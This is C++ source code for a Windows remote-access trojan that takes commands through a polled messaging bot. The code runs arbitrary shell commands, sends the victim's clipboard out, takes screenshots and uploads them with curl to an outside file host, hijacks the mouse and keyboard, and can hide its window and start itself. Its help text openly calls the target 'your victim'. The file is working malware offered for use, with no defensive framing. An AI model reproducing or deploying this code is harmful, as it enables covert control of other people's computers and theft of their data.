#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <time.h>
#include <sstream>
#include "troj.hpp"
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>

using namespace std;
using json = nlohmann::json;

constexpr int REFRESH = 1; //in seconds
constexpr bool AUTOSTART = 0; 
constexpr bool HIDE_TERMINAL = 0;

int main() {
	if(AUTOSTART) autostart();
	if(HIDE_TERMINAL) ShowWindow(::GetConsoleWindow(), SW_HIDE);
	logo();
	fstream file;
	file.open("ID.id");
	file >> ID;
	file.close();

	if (ID.empty()) ID = "X";

	Send(ID + " is running");
	cout << "ID: " + ID <<endl;
	while (true) {
		Sleep(REFRESH * 1000);
		json message = GetLastMessage();

		int last;
		file.open("last", ios::in);
		file >> last;
		file.close();

		if (last == message["message_id"]) continue;
		if (time(nullptr) - message["date"] > 3) continue;

		last = message["message_id"].get<int>();
		file.open("last", ios::out);
		file << last;
		file.close();


		string id = "", command = "", parameters = "";
		string parse = message["text"];
		for (int i = 0, it = 0; i < parse.size(); i++)
		{
			if (parse[i] == ' ') {
				it++; if(it <= 2)continue;
			}

			if (it == 0)id += parse[i];
			if (it == 1)command += parse[i];
			if (it > 1)parameters += parse[i];

		}
		if (id.empty() || command.empty()) continue;
		if (parameters.empty())parameters = "NULL";

		bool done = true;
		if (ID == id) { //I used json cause propably in developing dupnix i will use it
			cout << "ID passed, command " + command + " with parameters: " + parameters << endl;
			if (command == "Status") {
				string s; stringstream ss;
				Send(getStatus());
				done = false;
			}
			else if (command == "Cmd") {
				system(parameters.c_str());
			}
			else if (command == "SetCursor") {
				string x = "", y;
				for (int i = 0; i < parameters.length(); i++)
				{
					if (parameters[i] != ',')
						x += parameters[i];
					else break;
				}
				y = parameters.substr(x.length() + 1, parameters.length());
				int x1, y1;
				x1 = atoi(x.c_str());
				y1 = atoi(y.c_str());
				SetCursorPos(x1, y1);
			}
			else if (command == "BlockCursor") {
				int s = atoi(parameters.c_str());
				clock_t start = clock();
				while (true) {
					clock_t stop = clock();
					double time = (double)(stop - start) / CLOCKS_PER_SEC;
					if (time > s)break;
					SetCursorPos(0, 0);
					Sleep(5);
				}
			}
			else if (command == "SetVolume") {
				double volume = atoi(parameters.c_str());
				volume *= 0.01;
				ChangeVolume(volume, true);
			}
			else if (command == "BlockClipboard") 
			{
				if (parameters == "true")  OpenClipboard(nullptr); 
				else CloseClipboard();

			}
			else if (command == "SetID") 
			{
				setID(parameters);
				cout << "New ID: " + parameters<<endl;
			}
			else if (command == "Press") 
			{
				Sleep(500);
				for (int i = 0; i < parameters.length(); i++)
				{
					if (parameters[i] >= 65 && parameters[i] <= 90)press(parameters[i], 1); //for capital letters
					else
					switch (parameters[i]) {
					case 33:
					case 64:
					case 35:
					case 36:
					case 37:
					case 94:
					case 38:
					case 42:
					case 40:
					case 41:
					case 95:
					case 43:
					case 124:
					case 125:
					case 123:
					case 58:
					case 34:
					case 60:
					case 62:
					case 63:
						press(parameters[i], 1);
						break;
					default: press(parameters[i]);
					}
					
				}
			}
			else if (command == "SendClipboard") 
			{
				HANDLE clip = 0;
				OpenClipboard(NULL);

				if (IsClipboardFormatAvailable(CF_TEXT))
				{
					clip = GetClipboardData(CF_TEXT);
				}
				else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
				{
					clip = GetClipboardData(CF_UNICODETEXT);
				}
				CloseClipboard();

				char* buff = (char*)clip;
				string text;
				if (buff) text = buff;
				Send(text);
				done = false;
			}
			else if (command == "Screenshot") {

				string path;
				char letter[256 + 1];
				GetSystemDirectory(letter, sizeof(letter));

				path = letter[0];
				path += ":\\Users\\Public\\ss.jpg";

				TakeScreenShot(path.c_str());

				string l = "curl -F file=@" + path + " https://0x0.st -o buff";
				cout << l << endl;
				system(l.c_str()); l.clear();
				fstream file; file.open("buff", ios::in); file >> l;
				Send(l);
				remove("buff");
				done = false;
			}
			else if (command == "msgbox") { //"Text",number,"Title"

				file.open("msg.vbs", ios::out);
				while (true) {
					int find1 = parameters.find("\\");
					if (find1 != string::npos) parameters.erase(find1, 1);
					else break;
				}
				file << "x=msgbox(" << parameters << ")";
				file.close();
				system("msg.vbs");
				remove("msg.vbs");

			}
			else if (command == "Hotkey") {
				hotkeys(parameters+"+");
			}
			else if (command == "help") {
			if (parameters == "NULL") {
				string help = "Type <ID> help <command> for more specific info\nAll available commands: \n";
				help += "status\n";
				help += "cmd <command>\n";
				help += "SetCursor <X,Y>\n";
				help += "BlockCursor <seconds>\n";
				help += "SetVolume <0-100>\n";
				help += "BlockClipboard <true/fase> \n";
				help += "SetID <ID>\n";
				help += "Press <text>\n";
				help += "SendClipboard\n";
				help += "Screenshot\n";
				help += "msgbox <\"Text\",number,\"Title\">\n";
				help += "Hotkey <hotkey>\n";
				help += "help\n";
				Send(help);
			}
			 else {
				if (parameters == "status") Send("It sends some info, uptime is uptime of dupnix, not pc");
				else if (parameters == "cmd") Send("It works like a ssh");
				else if (parameters == "SetCursor") Send("It sets cursor to X,Y position");
				else if (parameters == "BlockCursor") Send("It blocks cursor at 0,0 for x seconds");
				else if (parameters == "BlockClipboard") Send("Makes your victim's clipboard non usable");
				else if (parameters == "SetVolume") Send("Sets volume in your victim's pc");
				else if (parameters == "SetID") Send("changes ID, defaultly it's X but you should change it to 420,69 etc");
				else if (parameters == "Press") Send("Makes your victim's pc is writing your stuff e.g polish proverb \"Jebac Disa!\"");
				else if (parameters == "SendCliboard") Send("Sends your victim's clipboard");
				else if (parameters == "Screenshot") Send("Makes a screenshot, uploading it to 0x0.st and giving you link");
				else if (parameters == "msgbox") Send("Makes a msgbox, you have to write it with \"s and ,s \navailable numbers: https://www.instructables.com/How-to-Make-a-message-box-using-VBScript/");
				else if (parameters == "help") Send("Yes i did help for help, here's tutorial what it does: https://www.youtube.com/watch?v=dQw4w9WgXcQ");
				else if (parameters == "Hotkey") Send("usage is ctrl, ctrl+a, shift+alt+del+ins+a, etc. all keys: \nesc\ntab\ncapslock\nshift\nctrl\nwin\nalt\nralt\nspace\nenter\nbackspace\ndel\nf1\nf..12\nins\nhome\nend\npgdn\npgup\nuparrow\ndownarrow\nleftarrow\nrightarrow\nlmouse"); //It's so fucking big step bro
				else Send("Wrong command.");
			 }
				done = false;
            }
			else {
			Send("Command not found, use <ID> help to check list of all commands");
			done = false;
            }
			if (done) Send("Done."); //If you see it that means dupnix didnt crashed so command done sucessfully
		}
	}
}
